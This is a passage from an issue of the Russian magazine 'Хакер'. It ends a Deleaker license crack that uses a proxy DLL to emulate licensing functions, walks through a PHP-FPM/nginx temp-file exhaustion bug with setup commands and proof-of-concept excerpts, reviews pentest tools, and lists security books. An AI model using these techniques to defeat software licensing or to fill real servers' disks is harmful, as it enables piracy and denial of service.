кает 24 января 2018 года. В «зарегистри рованной» версии программы
в буфере находится имя пользователя.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

           DELEAKER,
          НЕ БОЛЕЙ!
            ЛОМАЕМ ЗАЩИТУ В ОБХОД VMPROTECT
                         И ПИШЕМ PROXY DLL





ДВИЖЕМСЯ ДАЛЬШЕ
У нас остались еще две функции, в которые мы тоже заглянем.
  Снимаем точки останова, которые мы ста вили на выходе из функций,
и «отпускаем» отладчик, нажимая F9.
   Теперь в окне Deleaker кликаем License → License Status… и отладчик
теперь остановился в третьей интересующей нас функции DeleakerSD‐
K_GetLicenseInformation. В  эту функцию для получения необходимой
информации из ключа передается ука затель на уже «подготовленный» буфер
размером 1296 (0х510) байт. В него копиру ются данные о текущей лицензии,
а именно первые четыре байта, или DWORD, — это флаг, который указывает,
действующая лицензия или нет, и остальные байты — это информация
о лицензии в формате Unicode.
   Ставим точку останова на выходе из функции, в окне стека кликаем по вто‐
рому сверху адресу правой кноп кой и выбира ем Follow in Dump, в окне дампа
памяти увидим «пустую» область памяти — это и есть буфер‐приемник.
Далее «отпускаем» отладчик, нажимая F9, и оста навливаемся уже на точке
останова на выходе из функции. В регистре EAX находится TRUE. В буфере —
информация о текущей лицензии.





И последняя функция. В окне Deleaker кликаем License → VieW Serial…
Отладчик остановится в функции DeleakerSDK_GetSerialKey.





Она аналогична по формату приема парамет ров и отдачи данных DeleakerS‐
DK_GetRegisteredUserName, раз ница только в том, что она возвращает ука‐
затель на буфер с Unicode‐строкой в формате Base64 из файла DeleakerLi‐
cense.key, выделенный API SysAllocString, и флаг TRUE в EAX.





КОДИНГ
Теперь мы знаем все необ ходимые параметры и возвращаемые данные фун‐
кций.
  Для решения задачи я выбрал путь написания proxy DLL. Пере именовы‐
ваем    deleakersdk32.dll   в    deleaker32.dll.   Нужно   написать   свою
deleakersdk32.dll, которая будет перенап равлять все обращения через себя
в оригинальную deleakersdk32.dll за исключени ем функций, участвующих
в лицензировании (регистра ции) программы. Приведу код только тех фун‐
кций, которые мы будем эмулировать. Исходный код proxy DLL прикреплен
к статье ниже.
   Итак, код написан на макроас семблере, син таксис MASM. Это эмулиро‐
ванные мной функции:





И конечный результат.





             INFO

                        Так как Deleaker устанавливается и в Microsoft
                            Visual Studio в виде дополнения (.vsix), то про‐
                       цедуру с переименованием оригинальной DLL
                      и заменой ее нашей следует повторить и в дирек‐
                        тории,  куда   установлена   студия  в  папке
                          Extensions.



ВЫВОДЫ
Ты спросишь, а где же во всей этой истории VMProtect? И я отвечу, что он
в данном случае присутс тву ет в программе чис то номинально. Серьезный
потенциал VMProtect автор программы просто свел к нулю своими безгра‐
мотными действиями. Защитив, как ему казалось, критичные участки кода
в программе, он оставил дыру раз мером с футбольное поле.
 • Связывать раз ные платформы в одном про дук те (в нашем слу-
  чае это .NET и VC++) нуж но грамотно. Именно «на сты ке» платформ
   и образовалась гигантская «дыра». Если тебе важна безопасность, лучше
   вообще отказаться от чего‐то одно го.
 • Сто ит избавиться от «узких мест». Проверку лицензии и функционал
   программы, зависящий от результатов проверки лицензии, необходимо
   разместить в одном и том же модуле, накрыв критичные куски кода и код,
   который использует результат их работы, тем же самым VMProtect.
  Эффективность защиты при этом возрастет в разы.

Надеюсь, что разработчик прочитает эту статью и учтет все описанные недос‐
татки в защите сво его ПО.


        WWW

                     Для  желающих  подробнее  изучить  технику
                       написания proxy DLL на примере Deleaker при‐
                      лагаю сорцы  получившегося проекта.  Пароль
                       на архив — 123. Материалы предоставляются
                      исключительно в образовательных целях.


Скид ка 50% на Deleaker
После публикации статьи с нами связались ее раз работчики и пред ложили
скидку 50% для подписчиков «Хакера».
  На странице оплаты при покуп ке Deleaker введи промокод. Пос ле этого
стоимость программы превратится из 99 долларов в 49!
  Код для скид ки: XAKEP8563C5C5.
   Скидка действует до 2 марта 2018 года.
ВЗЛОМ
ХРАНИТЬ
ВЕЧНО

РАЗБИРАЕМ И ЭКСПЛУАТИРУЕМ
ОШИБКУ В ИНТЕРПРЕТАТОРЕ PHP





          aLLy
         ONsec
        @iamsecurity




В самом конце янва ря в багтрекере PHP появилось опи‐
сание интересного бага: некото рые сайты можно вывести
из строя, забив все сво бодное место временными фай лами.
Уязвимость до сих пор не устранена. Давай посмотрим,
как ее экс плуатировать.


Проблема возникает, когда PHP работает в связке с веб‐сервером nginx.
Воспользовавшись некорректной логикой при работе с дес крипторами зап‐
росов, злоумышленник может зас тавить сервер не удалять вре менные фай‐
лы, которые создаются при работе с данными форм вида multipart/form‐data.
Атакующий может отпра вить на сервер пачку запросов, которые будут
оставлять после себя произвольное количес тво временных файлов до тех
пор, пока не кончится место или не будут исчерпаны дру гие ресурсы.


ПРИГОТОВЛЕНИЯ
На момент написания статьи баг еще не запат чен, поэтому сгодится PHP
любой версии. Если тебе некогда возиться с исходниками и отладкой и ты
хочешь только проверить работу экс плоита, то можешь просто поставить все
пакеты из репозиториев. Нап ример, я буду исполь зовать версию 7.0.27 в кон‐
тейнере Docker с Debian 9.


docker run ‐‐rm ‐ti ‐‐cap‐add=SYS_PTRACE ‐‐security‐opt
seccomp=unconfined ‐‐name=phptmp ‐‐hostname=phptmp ‐p80:80 debian /
bin/bash

Теперь установим nginx и PHP и запустим их.


apt‐get update && apt‐get install ‐y php‐fpm nginx nano
apt‐get update && apt‐get install ‐y php5‐fpm php5‐dbg nginx nano

Отредактируем конфиг текущего сайта в /etc/nginx/sites‐enabled/de‐
fault, раскомментируем строки, которые отвечают за обработку файлов
PHP, и изме ним путь к файлу сокета. По дефолту это /run/php/php7.0‐fpm.
sock. В твоем случае он может быть дру гим, поэтому рекомендую заглянуть
в файл /etc/php/7.0/fpm/pool.d/www.conf и поискать директиву listen.


location ~ \.php$ {
    include snippets/fastcgi‐php.conf;
    fastcgi_pass unix:/run/php/php7.0‐fpm.sock;
}


service php7.0‐fpm start & service nginx start

Для успешной работы экспло ита тебе также понадобится любой скрипт
на PHP, который будет доступен из веба.


echo > /var/www/html/index.php

Это все, что нужно для демонс трации уязвимости. А вот если ты хочешь
разобраться в причинах и подробностях, то тут не обойтись без ручной ком‐
пиляции PHP. Для начала установим необ ходимые зависи мости.


apt‐get install ‐y build‐essential git autoconf automake libtool
re2c bison libxml2‐dev libgd‐dev curl gdb vim nano

Я решил остановиться на той же версии — 7.0.27. Только в этот раз скачаем
сорцы из гит‐репозитория.


git clone ‐‐depth=1 ‐‐branch PHP‐7.0.27 https://github.com/php/
php‐src.git
cd php‐src

Затем сконфигурируем с поддержкой PHP‐FPM.


./buildconf ‐‐force
./configure ‐‐enable‐debug ‐‐enable‐fpm ‐‐with‐fpm‐user="www‐data"
‐‐with‐fpm‐group="www‐data"

Осталось скомпилировать и уста новить. Тут все стандартно.


make
make install

Дальше в конфиге php‐fpm нужно настро ить количес тво дочерних процессов.
Чтобы было проще отла живать, рекомендую поставить их в 1.


pm = static
pm.max_children = 1

При отладке нужно включить возможность отла живать дочерние процессы
в GDB.


gdb ./sapi/fpm/php‐fpm
set follow‐fork‐mode child
r ‐‐nodaemonize ‐‐fpm‐config /etc/php/7.0/fpm/php‐fpm.conf





           Готовый к отладке свежесоб ранный PHP‐FPM 7.0.27

На этом с приготовлениями все.


ПОДРОБНОСТИ
На странице багтрекера PHP исследователь выложил вариант эксплоита.
Самое время его скачать и попробовать запустить. PoC, кстати, тоже написан
на PHP.





   После запуска экспло ита в директории /tmp соз дается ворох фай лов

Давай заглянем в исходный код и посмотрим, что же там происходит.
Переменные host и path отвечают за адрес хос та и путь до любого PHP‐
скрипта соответственно.


poc.php
4:  $host = 'localhost';
5:  $path = '/index.php';

Затем инициализируются переменные files и request. Первая отве чает
за количество файлов, передаваемых в одном запросе к серверу, вторая —
за количество этих самых зап росов.


poc.php
8:  $files = 20;
9:  $requests = 10;

Получается, что за один запуск эксплоита мы создаем 200 файлов. Дальше
идет формирование POST‐запроса, с помощью которого они будут отправ‐
ляться. Этот шаг неин тересен, поэто му мы его пропускаем. Дальше начина‐
ется подклю чение к серверу и отправка готово го реквеста.


41:     for($i = 1; $i <= $requests; $i++){
...
43:         $fp = stream_socket_client($scheme.($ip ? $ip : $host).':
'.($scheme ? 443 : 80), $errno, $errstr, 30);
44:         fwrite($fp, $header.$body);

А дальше происходит небольшая магия.


44:         fwrite($fp, $header.$body);
45:         stream_socket_shutdown($fp, STREAM_SHUT_RDWR);
46:         fclose($fp);

После отправки данных сокету обмен данными с ним останавливается. То
есть соединение закрыва ется, и скрипт не ждет ответа от сервера. Из‐за это‐
го получается, что nginx обрывает общение с PHP до того, как оно будет нор‐
мально завершено.
  Давай обратимся к исходникам. Вооб ще, весь процесс загрузки файлов
описан в спецификации Form‐based File Upload in HTML с идентификатором
RFC1867. И исходник из PHP, который занимается обработкой загруженных
файлов, имеет такое же наз вание. В нем нас интересует метод SAPI_‐
POST_HANDLER_FUNC.


/main/rfc1867.c
616: /* read until a boundary condition */
617: static int multipart_buffer_read(multipart_buffer *self, char *
buf, size_t bytes, int *end)
618: {

Функция php_open_temporary_fd_ex открывает временный файл на запись.


/main/rfc1867.c
1012:               blen = multipart_buffer_read(mbuff, buff, sizeof(
buff), &end);
...
1019:                   fd = php_open_temporary_fd_ex(PG(upload
_tmp_dir), "php", &temp_filename, 1);
1020:                   upload_cnt‐‐;
1021:                   if (fd == ‐1) {
1022:                       sapi_module.sapi_error(E_WARNING, "File
upload error ‐ unable to create a temporary file");
1023:                       cancel_upload = UPLOAD_ERROR_E;
1024:                   }

Дальше выполняется запись в файл переданного в запросе содержимого.


1058:                   wlen = write(fd, buff, blen);


poc.php
06:     $file = 'Hey, look at me, I’m a temporary file content.';





  Отладка кода на моменте создания временного файла и записи в него
  пользовательских данных

После того как скрипт index.php отработает (а он у нас пустой, так что
работать ему недол го), выполняются процеду ры по освобождению памяти,
очистке данных, которые были использованы в процессе, и прочие полезные
вещи. Все они объединены в метод php_request_shutdown.


/sapi/fpm/fpm/fpm_main.c
1969: fastcgi_request_done:
...
1995:           php_request_shutdown((void *) 0);


/main/main.c
1781: void php_request_shutdown(void *dummy)
1782: {

Нас интересует момент вызова функции sapi_deactivate.


/main/main.c
1861:   /* 12. SAPI related shutdown (free stuff) */
1862:   zend_try {
1863:       sapi_deactivate();
1864:   } zend_end_try();

В ее теле выполняется метод destroy_uploaded_files_hash. Он удаляет
все временные файлы, которые были соз даны для работы с пользовательски‐
ми данными, отправленными через форму с типом содержимого multipart/
form‐data.


/main/SAPI.c
501: SAPI_API void sapi_deactivate(void)
502: {
...
535:    if (SG(rfc1867_uploaded_files)) {
536:        destroy_uploaded_files_hash();
537:    }


/main/rfc1867.c
207: PHPAPI void destroy_uploaded_files_hash(void) /* {{{ */
208: {
209:    zend_hash_apply(SG(rfc1867_uploaded_files), unlink_filename);
210:    zend_hash_destroy(SG(rfc1867_uploaded_files));
211:    FREE_HASHTABLE(SG(rfc1867_uploaded_files));
212: }

Только вот выполнение не доходит до этого метода. Перед ним выпол няется
метод, указанный в методе deactivate текущего модуля. В нашем случае
это FPM/FastCGI и вызывается функция sapi_cgi_deactivate.


/main/SAPI.c
532:    if (sapi_module.deactivate) {
533:        sapi_module.deactivate();
534:    }
535:    if (SG(rfc1867_uploaded_files)) {
536:        destroy_uploaded_files_hash();
537:    }


/sapi/fpm/fpm/fpm_main.c
816: static int sapi_cgi_deactivate(void) /* {{{ */
817: {
...
822:    if (SG(sapi_started)) {
823:        if (
...
827:            !fcgi_finish_request((fcgi_request*)SG(server_context
), 0)) {





      Отладка PHP‐FPM. Момент вызова функции sapi_cgi_deactivate

На этом этапе завершает ся обработка всех зап росов и результаты отправ‐
ляются в соответствующие сокеты.


/main/fastcgi.c
1661: int fcgi_finish_request(fcgi_request *req, int force_close)
1662: {
1663:   int ret = 1;
1664:
1665:   if (req‐>fd >= 0) {
1666:       ret = fcgi_end(req);
1667:       fcgi_close(req, force_close, 1);
1668:   }
1669:   return ret;
1670: }

За этот процесс отвечает цепочка вызова функций fcgi_end → fcgi_flush
→ safe_write → write.


1652: int fcgi_end(fcgi_request *req) {
1653:   int ret = 1;
1654:   if (!req‐>ended) {
1655:       ret = fcgi_flush(req, 1);
1656:       req‐>ended = 1;
1657:   }
1658:   return ret;
1659: }
1510: int fcgi_flush(fcgi_request *req, int end)
1511: {
...
1514:   close_packet(req);
...
1530:   if (safe_write(req, req‐>out_buf, len) != len) {
922: static inline ssize_t safe_write(fcgi_request *req, const void *
buf, size_t count)
923: {
...
948:        ret = write(req‐>fd, ((char*)buf)+n, count‐n);





  Цепочка вызова функций до сра баты вания уязвимости в отладчике GDB

Метод write() пытается записать в сокет информа цию, которую возвращает
интерпретатор PHP. Но ему это не уда ется, потому что сокет уже закрыт:
соединение с nginx было прервано экс плоитом без ожидания и чтения ответа.
После выполнения этой конструкции процессу php‐fpm отправляется сигнал
SIGPIPE. Википедия дает нам исчерпывающее определение:



     В  POSIX-сис темах,  SIGPIPE —  сигнал,  посыла емый  процес су
      при записи в соединение (пайп, сокет) при отсутс твии или обры ве
      соединения с дру гой (чита ющей) стороной.

Так как изначально вся эта вереница вызовов была ини циирована конструк‐
цией вида zend_try, дальнейшее выполнение sapi_deactivate прекраща‐
ется благодаря zend_end_try.


/main/main.c
1861:   /* 12. SAPI related shutdown (free stuff) */
1862:   zend_try {
1863:       sapi_deactivate();
1864:   } zend_end_try();

Временные файлы не очищаются и остаются на сво их местах. Стоит только
добавить в эксплоит функцию чтения данных (fread) с сервера до того,
как разрывать соединение, и он перестанет работать. :‐)


poc_e.php
35:         $fp = stream_socket_client($scheme.($ip ? $ip : $host).':
'.($scheme ? 443 : 80), $errno, $errstr, 30000);
36:         fwrite($fp, $header.$body);
37:         fread($fp, 1); // спасибо за нейтрализацию эксплоита
38:         fclose($fp);


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Как видишь, уязвимость интересная и может помочь в рас крутке всевоз‐
можных инклудов. Например, когда не знаешь путей или нет прав на запись
в папку. Сбрутить имя временного файла гораз до проще, когда у тебя этих
файлов несколько десятков тысяч!
  Официального фикса пока что не существу ет, поэтому под прицелом —
большое количество сервисов. Уяз вима также связ ка nginx + PHP, где прок‐
сификация происходит по протоколу TCP.
  Идеальным фиксом будет отключить воз можность загрузки файлов, выс‐
тавив опцию file_uploads в Oﬀ. Но для боль шинс тва проектов это вряд ли
приемлемо, потому что картиночки все же нужно как‐то постить. :‐)
  В качестве временного решения можно попробовать пересобрать PHP,
обернув вызов sapi_module.deactivate() в конструкцию zend_try. Но я
не настоящий сварщик, и это может привести к непредсказуемым последс‐
твиям.


/main/SAPI.c
532:    if (sapi_module.deactivate) {
533:        zend_try { /* added */
534:            sapi_module.deactivate();
535:        } zend_end_try(); /* /added */
536:    }

Если у тебя есть более безболезненный и пра виль ный способ избавиться
от уязвимости, не стесняйся и пиши.
 ВЗЛОМ
X-TOOLS
#227




                                                              Илья Русанен
                                                                     Главный редактор ][,
                                                                занимаюсь разработкой и
                                                                        безопасностью
                                                                              rusanen@glc.ru





ПОДБОРКА ХАК‐ТУЛЗ
ДЛЯ РЕСЕРЧЕРА
И ПЕНТЕСТЕРА





  Сегодня в X‐Tools: отличный фронтенд для GDB/LLDB/WinD‐
  bg, проверенная тулза для спуфа портов и реверсивных атак,
  несколько крайне удачных расширений для Burp и просто
  мастхев‐утилиты в копилку любого ресерчера. Читай, ставь,
  советуй свое!


  ПРОКАЧИВАЕМ GDB/LLDB
   • Разработчик: snare
   • Страница: GitHub

  LLDB/GDB — проверенные временем инс трументы отладки, которые тем
  не менее из коробки имеют весьма спартанский интерфейс в силу исто‐
  рических причин. Разумеется, у многих ресерчеров есть удобный лично им
  фронтенд — от древних линуксовых поделий до модных macOS‐тулз типа
   Hopper. Voltron — еще один проект в этом ряду.





   Voltron — это удобный фронтенд на Python, который работает с LLDB, GDB
  и WinDbg. Он в наглядном виде покажет регис тры процессора, состояние
   памяти, дизассемблированный вывод и текущие брейк‐пойнты. Каждое «окно
  дашборда» удобно запус тить отдельным процессом под tmux, а для того, что‐
  бы расставить панели в удобном (читай: а‐ля тай ловом) поряд ке, автор спра‐
  ведливо предлагает использовать tmuxinator — надстройку для tmux, которая
  сохранит лейауты расположения окон tmux и позволит быстро восстановить
  сессию voltron с отладчиком до рабочей конфигура ции.
     К сожалению, snare, автор voltron, в пос леднее время основательно под‐
  забил на свой проект. Но и без этого voltron работа ет весьма стабильно и в
   каких‐то криминальных глю ках пока замечен не был.


  СПУФИМ ПОРТЫ
   • Разработчик: drk1wi
   • Страница: GitHub

  Часто первое, что делает атакующий, когда начинает работу с сервером, —
   аккуратно Nmap’ит все (а чаще самые популярные) порты. Оно и понятно:
  по статусу открытого порта (или CLOSED, или FILTERED) можно сделать вывод
  о том, какое ПО крутится на сервере, и часто по фингерпринтам воз вра‐
  щаемых данных можно определить и версию ПО и, соответственно, вырабо‐
   тать план атаки.





   Утилита portspoof несколько усложнит этот этап. Вмес то того чтобы воз вра‐
  щать  реальное  состояние  порта,  portspoof  будет  отвечать  валидным
  SYN/ACK’ом на любой запрос. При этом все порты будут казаться для ата‐
  кующего открытыми. Вторая осо бенность — на запросы к сервисам portspoof
  будет отвечать валидными динамичес кими сиг натура ми, которые якобы кру‐
   тятся на этих пор тах. Как результат, атакующему может понадобиться много
  времени, чтобы понять, что же в реальности происходит на атакуемом сер‐
   вере.


  ВИЗУАЛИЗИРУЕМ КЛИЕНТЫ
   • Разработчик: libnex
   • Страница: GitHub

  При  пентестах  часто  требует ся  использовать  несколько  браузеров
  для выполнения идентичных запросов и проверки результата — ответа сер‐
   вера. По умолчанию, если пус тить нес колько браузеров через прокси Burp’а,
  они будут показываться в едином списке, и понять, какой запрос от какого
  браузера, можно, толь ко если посмотреть, скажем, заголовки HTTP Request.





  Плагин Multi‐Browser Highlighting как раз реша ет эту проблему. Пос ле его
   установки и активации список выполненных запросов, которые поймал бур‐
  повский прокси, будет подсвечен раз личными цветами. Цвет запроса опре‐
  деляется в зависимости от того бра узера, который послал конкретный зап‐
   рос. Таким образом визу ально ты сможешь быстро отде лить запросы Chrome
   от Firefox и больше не путаться, прос леживая, ска жем, как первый запрос вли‐
   яет на второй.


  ДЕТЕКТИМ ХЕШИ
   • Разработчик: psypanda
   • Страница: GitHub

  Зачастую раздобыть заветные хеши — это далеко не все, что нужно сде лать
  перед тем, как начинать брут. Иногда еще бывает полезно понять, а что,
  собственно, будем брутить. Дру гими сло вами, что за хеш попался нам в сети.





   hashID — это чрезвычайно полезная тулза на Python 3, которая попытается
  определить, что за тип хеша перед ней. В библиотеке hashID более двухсот
  различных сигнатур хешей и сервисов, которые их используют. Пол ный спи‐
  сок доступен на Гитхабе в Excel‐файле. hashID дружит с hashcat, John The Rip‐
   per, а также без проб лем запус кается и на вто рой ветке Python.


 ИЩЕМ ОШИБКИ В S3+
   • Разработчик: VirtueSecurity
   • Страница: GitHub

  Amazon S3 — популярное облачное фай ловое хранилище. При довольно
  высокой стоимости Амазон обеспечивает простоту нас тройки, высокую дос‐
   тупность и миллион настроек. Из последнего преимущес тва вытекает логич‐
  ный недостаток — недосмотреть и неп равиль но сконфигурировать настройки
  бакета в S3 довольно просто.





  AWS Extender — это удоб ное расширение для Burp, которое поможет прос‐
  канировать AWS и другие облачные сервисы на типичные ошибки конфигура‐
  ции вроде неверно выставлен ных прав дос тупа или записи. В работе AWS Ex‐
   tender использует популярную биб лиотеку boto3, а также, кроме Амазона,
  поддерживает не менее популярные Google Cloud и Azure. Для работы пот‐
  ребуются собственные ключики AWS или Google Cloud.


  УПРОЩАЕМ СКАН WORDPRESS
   • Разработчик: kacperszurek
   • Страница: GitHub

  Wpscan, без сомнения, топовый скрипт, который помогает множеству ресер‐
  черов почти автоматичес ки находить уяз вимые инстал ляции WordPress. Что
  может быть проще: пускаешь скрипт через прокси, натравливаешь на сайт
  и через пару минут в удобном виде получа ешь инфу об устаревших плагинах,
   уязвимых плагинах и прочих интерес ных находках. Но можно еще удобнее.





  Burp WP — это плагин для Burp, который поможет тебе находить уязвимые
  места, не покидая любимого сканера. Тулза доступна прямо из BApp Store
  и для работы тре бует Jython. Все найденные проб лемы детально логиру ются
   в соответствующем разделе окна Burp, а воз можность работы с офлай новой
  базой дает плагину еще несколько очков. Программа активно развивается
  и содержит довольно подробный README. Обя зательно пробегись и включи
   в свой арсенал, если пользуешь ся Burp’ом для пентестов.


  ИЗВЛЕКАЕМ ДАННЫЕ ИЗ SVN
   • Разработчик: anantshri
   • Страница: GitHub

  История о доступных извне пап ках .svn или .git — притча во языцех. Тем
  не менее при пентестах регулярно встречаются бессовес тно торчащие
  наружу кишочки системы контроля версий исходного кода приложения.
  Конечно, Git сегодня более популярен, но SVN по‐прежнему встречается,
   в том числе и у больших проектов. Авто матизировать работу с этим безоб‐
  разием поможет Svn‐Extractor.





  Используя Svn‐Extractor, ты сможешь подробно разуз нать структуру исходно‐
   го кода проекта, найти файлы, которые не видны снаружи, посмотреть, кто,
   когда и что коммитил в про ект, а также вытащить изменения, которые были
  затерты более поздни ми коммитами. А в них вполне могут обнаружиться
  логины‐пароли от тестовых и не очень сервисов, случайно закоммиченные
  разработчиками. В общем, со всех сторон еще один полезный в хозяйстве
  инструмент.
 ВЗЛОМ





      Антон Карев
Эксперт по информационной
 безопасности. Образование
  высшее, специальность
   «Защита информации в
 компьютерных системах», в
настоящий момент работает
 над диссертацией. Область
    профессиональных
интересов — технологическая
разведка, аналитика в сфере
    ИБ, искусственный
         интеллект.
     vedacoder@mail.ru


 ОТ КИБЕРПАНКА
    DEVSECOPS  ДО
            7 КНИГ,РАДИ КОТОРЫХ DEVSEC‐
          OPS‐ИНЖЕНЕРУ СТОИТ ВЫУЧИТЬ
                        АНГЛИЙСКИЙ




  Помнишь «весь спектр радуги» лучших книг из леген дарного
  фильма  «Хакеры»?  Пересмотрев фильм еще  раз, мы
  задались вопросом: а что бы сегодня читали киберпанки
  прошлого, став шие в наше время DevSecOps’ами? И вот что
  у нас получилось...


  «РАДУЖНАЯ СЕРИЯ»





   • «Оранжевая книга»: критерии защиты данных компьютера по стандартам
    DOD.
   • «Розовая рубашка»: спра вочник IBM  (проз вали  так  из‐за стремной
     розовой рубашки на мужике с обложки).
   • «Книга дьявола»: библия UNIX.
   • «Книга дракона»: раз работка компилятора.
   • «Красная книга»: сети национального управления безопас ности (извес тна
      как «уродливая красная книга, которая не умещается на полке»).


  «ФИОЛЕТОВАЯ КНИГА»: РУКОВОДСТВО APT-ХАКЕРА


   Tyler Wrightson. Advanced Persistent
  Threat Hacking: The Art and Science
  of Hacking Any Organizations. 2015.
  434 p.
  Эта книга написана ради одной‐единс‐
  твенной цели: продемонс трировать, что
  в мире не существует безопасных систем.
  Причем написана она с позиции прес‐
   тупника, без компромиссов и лишней
  политкорректности. Автор беззастенчиво
  демонстрирует   современные   реалии
  кибер‐не‐безопасности  и  без  утайки
  делится самыми интимными подробнос‐
  тями APT‐хакерства. Такой бру тальный
  подход к изложению материала мож но
   понять: автор уверен, что только так мы
  сможем по‐настоящему «узнать своего
  врага в лицо», как это совето вал Сунь‐цзы в сво ей книге «Искусство войны».
  Только мысля как хакер, безопас ник смо жет раз работать сколь‐нибудь
  эффективную защиту от киберугроз.
    В книге описывается образ мыслей APT‐хакера, инс трументы и навыки —
  которые позволяют ему взламывать абсолютно любую организацию, вне
  зависимости от того, какая там раз верну та система безопасности. С демонс‐
  трацией реальных примеров взло ма, для реализации которых впол не дос‐
   таточно скромного бюджета и скромных технических навыков.


               INFO

                        Вся кий раз, когда мы читаем про «злые взломают
                             всех, кто под ключен хотя бы к сети 220 вольт»,
                    мы  вспоминаем  про  нашу  мифбрейкерскую
                          статью Всемогущество взломщика: оценива ем
                          реальную степень угрозы хакерских атак.



  «ЧЕРНАЯ КНИГА»: КОРПОРАТИВНАЯ КИБЕР(НЕ)БЕЗОПАСНОСТЬ


  Scott Donaldson. Enterprise Cyberse-
   curity: How to Build a Successful Cy-
  berdefense Program Against Ad-
  vanced Threats. 2015. 536 p.
  В книге представ лена гибкая и наглядная
  схема для управления всеми аспектами
  корпоративной    программы    кибер‐
  безопасности (КПК), в которой вся КПК
  разделена   на   11   функциональных
  областей и на 113 предметных аспектов.
  Эта схема очень удоб на для проектирова‐
   ния,  разработки,  внедрения,  контроля
  и оценки КПК, управле ния рисками. Схе‐
  ма универсальна и легко мас штабируется
  под нужды организации любых размеров.
  В книге подчеркивается, что абсолютная
  неуязвимость  прин ципиально   недос‐
  тижима. Потому что, имея в запасе неограниченное время, пред приимчивый
  злоумышленник может в конце концов преодолеть даже самую передовую
  киберзащиту. Поэтому эффективность КПК оценивается не в абсолютных
   категориях, а в отно сительных — двумя отно ситель ными показателями: нас-
  колько быстро она поз воляет обнаруживать кибера таки и насколько дол-
  го она позволяет сдерживать натиск противника. Чем лучше эти показатели,
  тем больше у штатных специалис тов времени на то, чтобы оценить ситу ацию
  и принять контрмеры.
    В книге подробно описаны все действующие лица на всех уровнях ответс‐
  твенности. Объясняется, как применять предложенную схему КПК для объ‐
  единения разношерстных департаментов, скромных бюджетов, корпоратив‐
  ных бизнес‐процессов и уязвимой киберин фраструктуры в рентабельную
  КПК, способную противос тоять передовым кибератакам и способную зна‐
   чительно сокращать ущерб в случае пробоя. В рентабельную КПК, которая
  принимает во внимание огра ниченность бюджета, выделенного на обес‐
  печение кибербезопасности, и которая помогает находить нужные компро‐
  миссы, оптимальные именно для вашей орга низации. С уче том повседневной
  оперативной деятельности и долгосрочных стратегических задач.
    При первом знакомстве с книгой вла дельцы малого и среднего бизнеса,
  имеющие ограниченные бюджеты, могут посчитать, что для них представ‐
  ленная в книге схема КПК, с одной стороны, не по карману, а с другой —
  вообще излишне громоздка. И действи тельно: далеко не все предприятия
   могут позволить себе учитывать все элементы комплексной программы КПК.
  Когда генеральный директор работает по совместительству также финан‐
  совым директором, секретарем и службой технической поддержки — пол‐
  номасштабная КПК явно не для него. Однако в той или иной степени проб‐
  лему кибербезопасности приходится решать любому пред приятию, и если
   почитать книгу внимательно, то мож но увидеть, что пред ставляемая схема
  КПК легко адаптируема под нужды даже самого маленького предприятия. Так
   что она подходит для предприятий любых раз меров.
     Следует заметить, что авторы книги — признанные эксперты по кибер‐
  безопасности, которым доводилось сра жаться «на передовой» против APT‐
   хакеров, отстаивая в разное время пра вительственные, военные и кор‐
  поративные интересы.


  «КРАСНАЯ КНИГА»: СПРАВОЧНИК «КРАСНОАРМЕЙЦА»


  Ben Clark. RTFM: Red Team Field
  Manual. 2014. 96 p.
  В RTFM приведен базовый синтаксис
  основных инструментов командной стро‐
   ки (для Windows и  Linux). Освещают ся
  и оригинальные  варианты  их  исполь‐
   зования, в комплек се с такими мощными
  инструментами,  как  Python и Windows
   PowerShell. RTFM будет снова и сно ва
  экономить  тебе  целую  кучу  времени
  и сил, избавляя от необ ходимости вспо‐
  минать/искать трудно запоминающиеся
  нюансы операционной системы, связан‐
  ные с такими инструментами, как Windows
  WMIC, инструмен ты командной  стро ки
  DSQUERY, значения ключей реес тра, син‐
   таксис планиров щика Task Scheduler, Win‐
  dows‐скрипты и так далее. Кроме того, что еще более важно, RTFM помогает
  своему читате лю перенять наиболее передо вые «крас ноармейские» техники.


  «КНИГА БИЗОНА»: КУЛЬТИВИРОВАНИЕ DEVOPS-КУЛЬТУРЫ В
  СООБЩЕСТВЕ РАЗРАБОТЧИКОВ


  Jennifer Davis, Ryn Daniels. Effective
  DevOps: Building a Culture of Collab-
   oration, Affinity, and Tooling
   at Scale. 2016. 410 p.
  Книга бизона (названа так из‐за зверя
  с обложки) — «самое удачное из ныне
  существующих пособий по формирова‐
  нию  корпоративной  DevOps‐культуры».
  Чувствуешь, как от этих слов потяну ло
  духом мутных психотренингов, коучинга,
  тимбилдингов и кор поративных гимнов? :)
  Тем не менее почитать ее стоит (если
  не веришь во всю эту фигню — то хотя бы
   чтобы знать врага в лицо и быть готовым,
   когда тебя захотят сделать членом боль‐
  шой и дружной семьи счастливых работ‐
   ников).  Впрочем,  достаточно  критики
  с позиции рядового члена команды — с точки зрения руководителя (а ведь
  они нас тоже читают), в этой книге DevOps рас сматривается как новый спо‐
  соб мышления и работы, позволяющий формировать «умные команды».
     «Умные команды» отличаются от прочих тем, что их члены понимают осо‐
  бенности своего образа мышления и применя ют это понимание с пользой
  для себя и для дела. Такая способность «умных команд» развивается
  в результате систематичес кой практики ToM (Theory of Mind, наука самоосоз‐
   нания). ToM‐компонент DevOps‐культуры позволя ет распознавать сильные
  стороны — свои и своих коллег; поз воляет улучшать понимание себя и дру‐
   гих. В результате способ ность людей сотрудничать и сопере живать друг дру‐
   гу увеличивается. Организации с развитой DevOps‐культурой реже допускают
  ошибки, быстрее восстанавлива ются пос ле сбоев. Сотрудни ки этих орга‐
  низаций чувствуют себя более счастливо. А счастливые люди, как известно,
  более продуктивны. Поэтому цель DevOps — выработка взаимопонимания
  и общих целей, позволяющих уста новить долговременные и прочные рабочие
  взаимоотношения между отдельными сот рудниками и целыми департамен‐
   тами.
     DevOps‐культура — это своеобразный фреймворк, располагающий к тому,
   чтобы обмениваться ценным практичес ким опы том и развивать между сот‐
  рудниками сопереживание. DevOps — это куль турная ткань, сплетенная
  из трех нитей: непрерывного выполнения дол жностных обязанностей, раз‐
  вития профессиональных компетенций и личного самосовершенствования.
  Эта культурная ткань «обво лакивает» как отдель ных сотрудников, так и целые
  департаменты, позволяя им эффективно и непрерывно развиваться в про‐
  фессиональном и личном плане. DevOps помогает уйти от «старого под хода»
   (культуры упреков и поис ка виноватых) и прийти к «новому подходу» (исполь‐
  зование неизбежных ошибок не для порицания, а для извле чения практичес‐
